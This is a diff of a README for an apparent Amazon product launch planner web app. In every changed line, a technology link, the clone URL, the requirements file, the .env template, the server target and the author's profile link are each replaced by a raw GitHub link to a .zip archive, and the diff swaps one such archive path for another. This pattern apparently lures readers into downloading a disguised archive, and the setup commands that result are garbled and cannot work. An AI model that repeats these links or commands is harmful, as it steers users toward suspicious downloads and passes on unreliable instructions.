@@ -38,11 +38,11 @@ A comprehensive web application for planning and managing product launches effic
 ## Tech Stack
 
 - **Frontend**
-  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
+  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip
   - TypeScript
   - React Router
   - Tailwind CSS
-  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip for Analytics
+  - https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip for Analytics
 
 - **Backend**
   - FastAPI (Python)
@@ -54,7 +54,7 @@ A comprehensive web application for planning and managing product launches effic
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip (v14 or higher)
+- https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip (v14 or higher)
 - Python 3.8+
 - PostgreSQL
 
@@ -62,7 +62,7 @@ A comprehensive web application for planning and managing product launches effic
 
 1. Clone the repository
 ```bash
-git clone https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
+git clone https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip
 cd product-launch-planner
 ```
 
@@ -77,22 +77,22 @@ npm install
 cd backend
 python -m venv venv
 source venv/bin/activate  # On Windows use: venv\Scripts\activate
-pip install -r https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip
+pip install -r https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip
 ```
 
 4. Set up environment variables
 ```bash
 # Create .env file in backend directory
-cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip .env
+cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip .env
 # Create .env file in frontend directory
-cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip .env
+cp https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip .env
 ```
 
 5. Start the development servers
 ```bash
 # Start backend server
 cd backend
-uvicorn https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip --reload
+uvicorn https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip --reload
 
 # Start frontend server (in a new terminal)
 cd frontend
@@ -150,7 +150,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## Author
 
 **Dawood Siddiq**
-- GitHub: [@dawoodsiddiq](https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/frontend/src/components/layout/amazon_product_launch_planner_connellite.zip)
+- GitHub: [@dawoodsiddiq](https://raw.githubusercontent.com/dsiddiq786/amazon_product_launch_planner/master/chrome-extension/src/amazon_planner_launch_product_v2.4.zip)
 
 ## Acknowledgments
 
